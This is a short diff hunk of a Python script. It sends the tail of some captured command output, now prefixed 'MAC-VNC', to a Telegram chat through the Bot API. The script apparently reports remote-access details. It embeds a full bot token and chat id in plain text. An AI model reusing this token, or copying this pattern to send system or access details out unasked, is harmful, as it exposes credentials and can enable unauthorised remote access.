@@ -9,5 +9,5 @@ sample_str = output
 last_chars = sample_str[-21:]
 
 
-url= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text={}'.format(last_chars)
+url= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text=MAC-VNC{}'.format(last_chars)
 requests.get(url)
